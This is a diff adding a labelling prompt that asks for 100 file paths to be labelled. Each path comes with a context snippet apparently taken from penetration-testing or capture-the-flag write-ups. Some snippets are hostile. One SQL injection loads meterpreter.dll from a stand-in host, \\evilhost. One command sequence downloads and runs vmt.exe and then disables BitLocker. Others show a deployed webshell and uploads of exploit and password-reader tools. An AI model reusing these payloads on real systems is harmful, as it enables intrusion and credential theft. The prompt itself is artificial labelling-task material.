@@ -1,0 +1,203 @@
+Label these 100 paths (chunk 3/15).
+Reply with one jsonl code block, one record per path, in input order.
+
+1. C:\programdata\SeManageVolumeExploit.exe
+   context: 11.71/SeManageVolumeExploit.exe: 100%|█| 12.0k/12.0k [00:00<00:0 [+] File uploaded successfully as: C:\programdata\SeManageVolumeExploit.exe evil-winrm-py PS C:\programdata> .\SeManageVolumeExploit.ex
+2. /ten.vl/dist/img/donkey-ddos.jpg
+   context: 226w     4525c http://ten.vl/attribution.php 200      GET      127l      339w    23825c http://ten.vl/dist/img/donkey-ddos.jpg 200      GET      133l      601w    58305c http://ten.vl/dist/img/art-bri
+3. /root/.local/share
+   context: /root /root/.bash_history /root/.bashrc /root/.cache /root/.cache/motd.legal-displayed /root/.local /root/.local/share /root/.local/share/nano /root/.local/share/nano/search_history /root/.mysql_histo
+4. /var/www/proxy
+   context: <VirtualHost *:80>   ServerName proxy.gofer.htb   ServerAdmin webmaster@localhost   DocumentRoot /var/www/proxy   ErrorLog ${APACHE_LOG_DIR}/error.log   CustomLog ${APACHE_LOG_DIR}/access.log combined
+5. /certificates/generated/RootCA.key
+   context: p/pub:/var/ftp/pub"       - "./certificates/generated/RootCA.crt:/var/ftp/pub/RootCA.crt"       - "./certificates/generated/RootCA.key:/var/ftp/pub/RootCA.key"     healthcheck:       test: ["CMD", "ba
+6. /Eureka-Server/target/classes/application.yaml
+   context: .properties ./user-management-service/pom.xml ./Eureka-Server/target/maven-archiver/pom.properties ./Eureka-Server/target/classes/application.yaml ./Eureka-Server/target/surefire-reports/com.eureka.se
+7. C:\Tools\KrbRelay\KrbRelay\bin\Release\KrbRelay.exe
+   context: ENTICATION_SERVICE.hr' is never assigned to, and will always have its default value 0   KrbRelay -> C:\Tools\KrbRelay\KrbRelay\bin\Release\KrbRelay.exe ========== Build: 2 succeeded, 0 failed, 0 up-to
+8. /src/permissions.ts
+   context: rc/import.ts",     options: "./src/options.ts",     qrdebug: "./src/qrdebug.ts",     permissions: "./src/permissions.ts",   },
+9. /surveillance.htb/index.php
+   context: llance.htb/fonts => http://surveillance.htb/fonts/ 200      GET      475l     1185w    16230c http://surveillance.htb/index.php 404      GET        0l        0w        0c http://surveillance.htb/css/s
+10. /etc/ipsec.conf
+   context: /etc/ipsec.conf
+11. \\vmt.exe\r\ndel
+   context: r\niwr http://10.10.11.90:81/vmt.exe -O vmt.exe\r\niwr http://10.10.15.62:81/vmt.exe -O vmt.exe\r\n.\\vmt.exe\r\ndel .\\vmt.exe\r\nmanage-bde -off c:\\\r\ndisable-bitlocker -mountpoint c:\\\r\npowersh
+12. C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\0BF00013FEFE
+   context: 1CCC0ADD RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\03B10A11ABB0 RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\0BF00013FEFE RW C:\Windows\S
+13. /soulmate.htb/login.php
+   context: created new filter; toggle off with --dont-filter 200      GET      178l      488w     8554c http://soulmate.htb/login.php 200      GET      473l      932w     8657c http://soulmate.htb/assets/css/sty
+14. /var/vpopmail
+   context: es:x:35:35:games:/usr/games:/sbin/nologin cyrus:x:85:12::/usr/cyrus:/sbin/nologin vpopmail:x:89:89::/var/vpopmail:/sbin/nologin ntp:x:123:123:NTP:/var/empty:/sbin/nologin smmsp:x:209:209:smmsp:/var/sp
+15. C:\Users\maya\desktop
+   context: *Evil-WinRM* PS C:\Users\maya\desktop> type user.txt 5f13f085************************
+16. /js/jquery.min.js
+   context: <script src="/js/jquery.min.js"></script> ...[snip]...
+17. C:\Users\matthew\Documents
+   context: 147258369  Evil-WinRM shell v3.4  Info: Establishing connection to remote endpoint  *Evil-WinRM* PS C:\Users\matthew\Documents>
+18. /home/svcMosh
+   context: sswd | grep 'sh$' root:x:0:0:root:/root:/bin/bash svcMosh:x:1002:1002:svcMosh,60001,8675309,8675309:/home/svcMosh:/bin/bash
+19. /.wpscan/scan.yml
+   context: ~/.wpscan/scan.yml
+20. /opt/exploit-database/files_shellcodes.csv
+   context: oit-database/.searchsploit_rc" for "files_exploits.csv" (package_array: exploitdb)  [i] Found (#2): /opt/exploit-database/files_shellcodes.csv [i] To remove this message, please edit "/opt/exploit-dat
+21. C:\Users\svc_ldap\desktop
+   context: *Evil-WinRM* PS C:\Users\svc_ldap\desktop> cat user.txt 31d4b9bf************************
+22. /home/scryh
+   context: bob@response:/home/scryh$ ls -l total 8 drwx------ 2 scryh scryh 4096 Mar 16  2022 incident_2022-3-042 drwxr-xr-x 5 scryh sc
+23. /var/www/html/index.php
+   context: oxdf@hacky$ uv run --script read_file.py zero.vl zro-de834d1c cbc6427b /var/www/html/index.php <!doctype html> <html lang="en">   <head>     <meta charset="utf-8">     <meta name="viewport" cont
+24. /certificate.htb/about.php
+   context: icate.htb/static => http://certificate.htb/static/ 200      GET      372l     1136w    14826c http://certificate.htb/about.php 200      GET      263l      754w    10605c http://certificate.htb/contact
+25. /opt/bitnami/apache/conf
+   context: = APACHE_DEFAULT_CONF_DIR=/opt/bitnami/apache/conf.default WORDPRESS_LOGGED_IN_KEY= APACHE_CONF_DIR=/opt/bitnami/apache/conf HOME=/ KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443 WEB_SERVER_DAEMON_GROUP=
+26. /home/oxdf/.local/share/pipx/venvs/impacket/lib/python3.12/site-packages/impacket
+   context: 12.0 - Copyright Fortra, LLC and its affiliated companies   [+] Impacket Library Installation Path: /home/oxdf/.local/share/pipx/venvs/impacket/lib/python3.12/site-packages/impacket [+] Using Kerberos
+27. /var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_038
+   context: file or directory (2) [2415:2418:0309/174909.483535:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_038": No such file or director
+28. /home/jennifer
+   context: andrew@pikatwoo:/home/jennifer$ grep -ir cri-o . 2>/dev/null ./.minikube/logs/lastStart.txt:I0318 10:22:24.318492     443 preload.
+29. /home/app/app/requirements.txt
+   context: he__/app.cpython-38.pyc /home/app/app/app.py /home/app/app/instance /home/app/app/instance/users.db /home/app/app/requirements.txt /home/app/app/static /home/app/app/static/app.zip /home/app/app/stati
+30. /home/oxdf/.local/share/uv/tools/impacket/lib/python3.12/site-packages/Cryptodome/Cipher/AES.py
+   context: e/uv/tools/impacket/lib/python3.12/site-packages/impacket/crypto.py", line 150, in AES_CMAC   File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.12/site-packages/Cryptodome/Cipher/AES.py", li
+31. /opt/tipnet/target/debug/deps/tipnet-a859bd054535b3c1
+   context: r@sandworm:~$ find / -type f -perm -2000 -o -perm -4000 2>/dev/null /opt/tipnet/target/debug/tipnet /opt/tipnet/target/debug/deps/tipnet-a859bd054535b3c1 /opt/tipnet/target/debug/deps/tipnet-dabc93f77
+32. C:\ProgramData\GMSAPasswordReader.exe
+   context: l-WinRM* PS C:\ProgramData> upload GMSAPasswordReader.exe Info: Uploading GMSAPasswordReader.exe to C:\ProgramData\GMSAPasswordReader.exe  Data: 140628 bytes of 140628 bytes copied  Info: Upload succe
+33. C:\Users\support\Documents
+   context: Watchful'  Evil-WinRM shell v3.3  Info: Establishing connection to remote endpoint  *Evil-WinRM* PS C:\Users\support\Documents>
+34. /usr/lib/snapd/snap-confine
+   context: jonathan@snapped:~$ ls -l /usr/lib/snapd/snap-confine  -rwsr-xr-x 1 root root 159016 Aug 20  2024 /usr/lib/snapd/snap-confine
+35. /var/ftp/pub
+   context: environment:       ANONYMOUS_ACCESS: true       LOG_STDOUT: true     volumes:       - "./ftp/pub:/var/ftp/pub"       - "./certificates/generated/RootCA.crt:/var/ftp/pub/RootCA.crt"       - "./certific
+36. /usr/lib/xwiki-jetty/start_xwiki.sh
+   context: xwiki/data  [Service] WorkingDirectory=/var/lib/xwiki/  # Lifecycle Type=simple ExecStart=/bin/bash /usr/lib/xwiki-jetty/start_xwiki.sh ExecStop=/bin/bash /usr/lib/xwiki-jetty/stop_xwiki.sh Restart=on
+37. C:\Users\mikasaAckerman\desktop
+   context: PS C:\Users\mikasaAckerman\desktop> cat user.txt 4b621f61************************
+38. /var/log/zapi/api.log
+   context: 35872b9f15b56b988c1" ln -s /proc .config/bin/process_informations echo "$(date) api config done" >> /var/log/zapi/api.log  exit 1
+39. /var/../root/.ssh/id_rsa
+   context: r/../root/root.txt /var/../root/.cache/ /var/../root/.cache/motd.legal-displayed /var/../root/.ssh/ /var/../root/.ssh/id_rsa /var/../root/.ssh/authorized_keys /var/../root/.bash_history /var/../root/.
+40. /home/fritz
+   context: ' root:x:0:0:root:/root:/bin/bash admin:x:1000:1000:Debian:/home/admin:/bin/bash fritz:x:1001:1001::/home/fritz:/bin/bash
+41. C:\Get-bADpasswords.ps1
+   context: C:\Get-bADpasswords.ps1
+42. /HelloLiunx/bin/Debug/net6.0/HelloLiunx.dll
+   context: NET   Determining projects to restore...   All projects are up-to-date for restore.   HelloLiunx -> /HelloLiunx/bin/Debug/net6.0/HelloLiunx.dll  Build succeeded.     0 Warning(s)     0 Error(s)  Time 
+43. /scripts/git-commit.sh
+   context: hp ./actions/action_handler.php ./actions/image2pdf.php ./assets/img/forestbridge.jpg ./.gitignore ./scripts/git-commit.sh
+44. C:\Windows\System32\Tasks
+   context: ww.sysinternals.com  RW C:\Windows\Tasks RW C:\Windows\tracing RW C:\Windows\Registration\CRMLog  W C:\Windows\System32\Tasks RW C:\Windows\System32\spool\drivers\color RW C:\Windows\SYSVOL\domain\scr
+45. /var/lib/openmediavault/cron.d/userdefined-b8068c15-0d5e-4d38-a7d0-6885a31c8a53
+   context: /sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # m h dom mon dow user    command * * * * * root /var/lib/openmediavault/cron.d/userdefined-b8068c15-0d5e-4d38-a7d0-6885a31c8a53 >/dev/null 2>&1
+46. C:\Windows\Tasks\uploads\$randomVariable\$filename
+   context: ng the File in Windows Media Player         Start-Process -FilePath $mediaPlayerPath -ArgumentList "C:\Windows\Tasks\uploads\$randomVariable\$filename"          # Wait for 15 seconds         Start-Sle
+47. \\r\ncd
+   context: ue ``\n    -Profile Any ``\n    -Description "Allow MSSQL access from any IP address"\r\nls \\users\\\r\ncd .\\Desktop\\\r\nnotepad root.txt\r\nnotepad C:\\Users\\mssqlsvc\\Desktop\\user.txt\r\ndir\r\
+48. /tmp/tle/root.txt
+   context: ROUP=starlink&FORMAT=tle'   id_rsa   noaa.txt   root.txt   test   weather.txt jovian@jupiter:~$ cat /tmp/tle/root.txt 239169f5************************
+49. C:\Users\keysvc\Desktop
+   context: C:\Users\keysvc\Desktop>type user.txt ffe18953************************
+50. C:\Users\winrm_svc
+   context: *Evil-WinRM* PS C:\Users\winrm_svc> whoami /groups  GROUP INFORMATION -----------------  Group Name                                  T
+51. \\evilhost\evilshare\meterpreter.dll
+   context: UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
+52. C:\Windows\System32\SyncAppvPublicationServer.vbs
+   context: HOSPITAL\Administrator Task To Run:                          powershell.exe -c "python.exe C:\Windows\System32\SyncAppvPublicationServer.vbs" Start In:                             N/A Comment:        
+53. /var/backups/project.zip
+   context: ive: 2984 folders, 17945 files, 113878790 bytes (109 MiB)                         Creating archive: /var/backups/project.zip  Items to compress: 20929
+54. /var/www/market/index.php
+   context: --file-read=/var/www/market/index.php
+55. C:\Users\0xdf\Desktop
+   context: .0.19045.3693] (c) Microsoft Corporation. All rights reserved.  FLARE-VM Fri 08/01/2025 11:11:24.33 C:\Users\0xdf\Desktop>
+56. \\r\ndir\r\n
+   context: ows\\Tasks\\SQL2022-SSEI-Expr.exe\r\ncd \\\r\ndir\r\ncd .\\SQL2022\\\r\ndir\r\ncd .\\Evaluation_ENU\\\r\ndir\r\n.\\SETUP.EXE /ACTION=Install\r\nget-service -Name MSSQLSERVER\r\nNew-NetFirewallRule -Di
+57. C:\Users\drbrown.HOSPITAL\desktop
+   context: PS C:\Users\drbrown.HOSPITAL\desktop> type user.txt a93d0145************************
+58. /opt/analyse.sh
+   context: /opt/analyse.sh
+59. /user-management-service/pom.xml
+   context: nt-service/log/application.log ./user-management-service/src/main/resources/application.properties ./user-management-service/pom.xml ./Eureka-Server/target/maven-archiver/pom.properties ./Eureka-Serve
+60. /var/www/chamilo
+   context: www-data@permx:/var/www/chamilo$ su mtz Password:  mtz@permx:/var/www/chamilo$
+61. C:\$Recycle.Bin
+   context: C:\$Recycle.Bin
+62. /var/www/ispconfig
+   context: www-data@nocturnal:~$ cd /var/www/ispconfig www-data@nocturnal:~/ispconfig$ ls admin        dashboard          index.php      mailuser    sites
+63. C:\Users\M.harris\Documents
+   context: trator.htb  Evil-WinRM shell v3.5  Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\M.harris\Documents>
+64. C:\Users\Administrator\Documents\cleanup.ps1
+   context: Action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-ExecutionPolicy Bypass -File C:\Users\Administrator\Documents\cleanup.ps1"` $Trigger = New-ScheduledTaskTrigger -Once -At (Get-Da
+65. C:\Users\emily\desktop
+   context: *Evil-WinRM* PS C:\Users\emily\desktop> cat user.txt 142aa43f************************
+66. C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\D0ECECBC1CCF
+   context: \scripts\A32FF3AEAA23\CD102CDEFD0E RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\CED022B22EBA RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\D0ECECBC1CCF RW C:\Windows\SYSVOL\domain\scripts\A32FF
+67. C:\Windows\System32\taskhostw.exe
+   context: 32\4.14.0\IEDriverServer.exe  3088  1496  taskhostw.exe            x64   1        HOSPITAL\drbrown  C:\Windows\System32\taskhostw.exe  3452  2744  iexplore.exe             x64   1        HOSPITAL\drbr
+68. C:\Users\e.black\Documents
+   context: SfEERy300  Evil-WinRM shell v3.4  Info: Establishing connection to remote endpoint  *Evil-WinRM* PS C:\Users\e.black\Documents>
+69. C:\Users\Lion.SK\desktop
+   context: evil-winrm-py PS C:\Users\Lion.SK\desktop> cat user.txt 413d8c7e************************
+70. C:\Users\Richard
+   context: PS C:\Users\Richard> ls      Directory: C:\Users\Richard  Mode                 LastWriteTime         Length Name ----
+71. C:\Users\PPotts
+   context: PS C:\Users\PPotts> cmdkey /list  Currently stored credentials:      Target: LegacyGeneric:target=MyTarget     Type: G
+72. /portal.guardian.htb/student/notices.php
+   context: tices => http://portal.guardian.htb/admin/notices/ 302      GET        0l        0w        0c http://portal.guardian.htb/student/notices.php => http://portal.guardian.htb/login.php 200      GET       
+73. /home/dvir/app
+   context: /home/dvir/app/
+74. C:\Users\Public
+   context: ProcessorNotification --------------------------> FFFFF8042E5DBD00   PATHS [+] Folder Public Path = C:\Users\Public [+] Base log file name path= LOG:C:\Users\Public\21 [+] Base file path = C:\Users\Pu
+75. /usr/bin/mkdir
+   context: "     exit 1 fi  MODEL_FILE="$1" TEMP_DIR="/models/temp" PYTHON_SCRIPT="/models/evaluate_model.py"  /usr/bin/mkdir -p "$TEMP_DIR"  file_type=$(/usr/bin/file --brief "$MODEL_FILE")  # Extract based on 
+76. c:\Users\svc_exampanel\Desktop
+   context: c:\Users\svc_exampanel\Desktop> type user.txt 1198a84a************************
+77. C:\Users\Sharon.Mullard
+   context: *Evil-WinRM* PS C:\Users\Sharon.Mullard> tree . /f Folder PATH listing Volume serial number is 00000154 560D:8100 C:\USERS\SHARON.MULLARD +
+78. C:\Users\drbrown.HOSPITAL\Documents\ghostscript.bat
+   context: & strFile)         Next         If Right(strFile, 4) = ".eps" Then                 call RunCommand("C:\Users\drbrown.HOSPITAL\Documents\ghostscript.bat " & strFile)         Else                 Dim fs
+79. /path/to/monitor.php
+   context: job. Here’s an example of a crontab entry that will run it every minute:  * * * * * /usr/bin/php -f /path/to/monitor.php >/dev/null 2>&1  */  include('config/configuration.php');  $monitors = json_dec
+80. /opt/tipnet/access.log
+   context: query, justification);      let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {         Ok(file) => file,         Err(e) => {             println!("Error
+81. C:\Users\Bob.Wood\appdata\local\microsoft\edge\User
+   context: C:\Users\Bob.Wood\appdata\local\microsoft\edge\User Data
+82. /home/sbrown/scanfiles/exploit.dmg
+   context: sbrown@snoopy:~$ sudo clamscan --debug /home/sbrown/scanfiles/exploit.dmg LibClamAV debug: searching for unrar, user-searchpath: /usr/local/lib LibClamAV debug: unrar suppor
+83. /opt/website-monitor/config/configuration.php
+   context: albert@alert:~$ find / -group management 2>/dev/null /opt/website-monitor/config /opt/website-monitor/config/configuration.php
+84. /etc/mysql/debian.cnf
+   context: my $command = 'mysqldump';       if ($super) {         $command .= ' --defaults-file=/etc/mysql/debian.cnf';       } elsif ($dbUser) {         $command .= ' -u'.$dbUser;         $command .= ' -p\''.$d
+85. /opt/SecLists/Discovery/Web-Content/api/api-endpoints-res.txt
+   context: oxdf@hacky$ ffuf -u http://internal.analysis.htb/users/list.php?FUZZ= -w /opt/SecLists/Discovery/Web-Content/api/api-endpoints-res.txt -ac          /'___\  /'___\           /'___\               /\ \__
+86. /usr/local/lib/python3.8/dist-packages/impacket
+   context: 19.101925.12de27dc - Copyright 2021 SecureAuth Corporation  [+] Impacket Library Installation Path: /usr/local/lib/python3.8/dist-packages/impacket Traceback (most recent call last):   File "/usr/loca
+87. /mnt/Katie.Ward
+   context: 4 /mnt/Joyce.Andrews  844424930132669      1 drwxrwxrwx   2 nobody   nogroup        64 Sep 13  2024 /mnt/Katie.Ward 1125899906843329      1 drwxrwxrwx   2 nobody   nogroup        64 Sep 13  2024 /mnt/
+88. /root/TeamCity/buildAgent/lib/mxparser.jar
+   context: jar:/root/TeamCity/buildAgent/lib/spring-aspects.jar:/root/TeamCity/buildAgent/lib/jdk-searcher.jar:/root/TeamCity/buildAgent/lib/mxparser.jar:/root/TeamCity/buildAgent/lib/commons-compress.jar:/root/
+89. /target/maven-status/maven-compiler-plugin/compile/default-compile/inputFiles.lst
+   context: nputFiles.lst ./target/maven-status/maven-compiler-plugin/compile/default-compile/createdFiles.lst ./target/maven-status/maven-compiler-plugin/compile/default-compile/inputFiles.lst ./target/Furni-0.0
+90. /var/www/automation
+   context: │ │ script id         │ 2                                  │ │ exec cwd          │ /var/www/automation                │ │ exec mode         │ fork_mode                          │ │ node.js version   │
+91. /var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_045
+   context: file or directory (2) [2415:2418:0309/174909.483723:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_045": No such file or director
+92. /etc/apache2/sites-enabled/vhost.conf
+   context: /etc/apache2/sites-enabled/vhost.conf
+93. C:\Windows\Installer
+   context: C:\Windows\Installer
+94. /usr/local/lib/python3.10/dist-packages/zmq/utils/config.json
+   context: jovian@jupiter:~$ find / -name 'config.json' 2>/dev/null /usr/local/share/sattrack/config.json /usr/local/lib/python3.10/dist-packages/zmq/utils/config.json
+95. /surveillance.htb/shell.php
+   context: tmp [+] trick imagick to move shell.php in /var/www/html/craft/web  [+] Webshell is deployed: http://surveillance.htb/shell.php?cmd=whoami [+] Remember to delete shell.php in /var/www/html/craft/web w
+96. /tmp/blockdev.VY5KP
+   context: -o -name '*blockdev*' -o -name 'temp-*' -o -name '.*-XXX*' \) 2>/dev/null; done | awk '!seen[$0]++' /tmp/blockdev.VY5KP
+97. c:\share
+   context: 7 56824 Microsoft Windows [Version 10.0.20348.643] (c) Microsoft Corporation. All rights reserved.  c:\share>
+98. /run/snap.docker/containerd/containerd.toml
+   context: ig/daemon.json root      1246  0.2  2.1 1351056 44512 ?       Ssl  01:16   1:31 containerd --config /run/snap.docker/containerd/containerd.toml --log-level error root      1494  0.0  0.1 1226188 3224 
+99. /usr/local/mirthconnect/appdata/keystore.jks
+   context: /usr/local/mirthconnect/appdata/keystore.jks
+100. /localhost/assets/js/main.js
+   context: 0309/174909.801669:VERBOSE1:network_delegate.cc(37)] NetworkDelegate::NotifyBeforeURLRequest: http://localhost/assets/js/main.js [2450:2450:0309/174909.983665:VERBOSE1:script_context.cc(150)] Created 
